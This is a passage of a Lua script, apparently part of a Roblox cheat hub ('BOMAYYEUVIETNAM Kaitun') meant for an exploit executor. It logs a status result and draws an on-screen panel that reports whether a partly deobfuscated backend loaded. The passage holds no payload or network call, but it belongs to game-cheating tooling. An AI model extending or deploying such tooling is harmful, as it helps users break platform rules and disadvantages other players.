    getgenv().BOMAYYEUVIETNAMKaitunRunning = true
  end
end)

pcall(function()
  warn("[BOMAYYEUVIETNAM-Fix] fn() ok=" .. tostring(val175) .. " err="
    .. tostring(success):sub(1, 300))
end)

print("[BOMAYYEUVIETNAM-Fix] fn() ok=" .. tostring(val175) .. " err=" .. tostring(success):sub(1, 300))

pcall(function()
  local localPlayer2 = players.LocalPlayer

  if not localPlayer2 then
    return
  end

  local waitForChild = nil
  pcall(function() waitForChild = localPlayer2:WaitForChild("PlayerGui", 5) end)

  if not waitForChild then
    pcall(function() waitForChild = coreGui end)
  end

  if not waitForChild then
    return
  end

  pcall(function()
    local bomayyeuvietnamFixStatus = waitForChild:FindFirstChild("BOMAYYEUVIETNAMFixStatus")

    if bomayyeuvietnamFixStatus then
      bomayyeuvietnamFixStatus:Destroy()
    end
  end)

  local bomayyeuvietnamFixStatus2 = Instance.new("ScreenGui")
  bomayyeuvietnamFixStatus2.Name = "BOMAYYEUVIETNAMFixStatus"
  bomayyeuvietnamFixStatus2.ResetOnSpawn = false
  bomayyeuvietnamFixStatus2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  bomayyeuvietnamFixStatus2.DisplayOrder = 999999
  bomayyeuvietnamFixStatus2.Parent = waitForChild

  local frame = Instance.new("Frame")
  frame.Size = UDim2.fromOffset(380, 190)
  frame.Position = UDim2.new(0.5, -190, 0.2, 0)
  frame.BackgroundColor3 = Color3.fromRGB(17, 25, 38)
  frame.BorderSizePixel = 0
  frame.Parent = bomayyeuvietnamFixStatus2

  local textLabel3 = Instance.new("TextLabel")
  textLabel3.Size = UDim2.new(1, -20, 0, 28)
  textLabel3.Position = UDim2.new(0, 10, 0, 8)
  textLabel3.BackgroundTransparency = 1
  textLabel3.Text = "BOMAYYEUVIETNAM Kaitun (Ban sua 241:334)"
  textLabel3.TextColor3 = Color3.fromRGB(135, 206, 250)
  textLabel3.TextSize = 16
  textLabel3.Font = Enum.Font.Fantasy
  textLabel3.TextXAlignment = Enum.TextXAlignment.Left
  textLabel3.Parent = frame

  local textLabel4 = Instance.new("TextLabel")
  textLabel4.Size = UDim2.new(1, -20, 1, -48)
  textLabel4.Position = UDim2.new(0, 10, 0, 40)
  textLabel4.BackgroundTransparency = 1
  textLabel4.TextWrapped = true
  textLabel4.TextYAlignment = Enum.TextYAlignment.Top
  textLabel4.TextXAlignment = Enum.TextXAlignment.Left
  textLabel4.TextSize = 13
  textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
  textLabel4.Font = Enum.Font.Code

  local strVal = "fn ok=" .. tostring(val175)

  if not val175 then
    strVal = strVal .. "\nLoi: " .. tostring(success):sub(1, 220)
  end

  strVal = strVal .. "\nPlaceId=" .. tostring(game.PlaceId)

  strVal = strVal
    .. "\nNeu khong thay BOMAYYEUVIETNAM HUB: backend CreateUI (v/val2) + cac block 189+ chua duoc devirt (HttpGet/loadstring = 0 lan trong ban deobf). Chup man hinh khung nay + log console (F9) gui lai de khoi phuc tiep."

  textLabel4.Text = strVal
  textLabel4.Parent = frame
end)
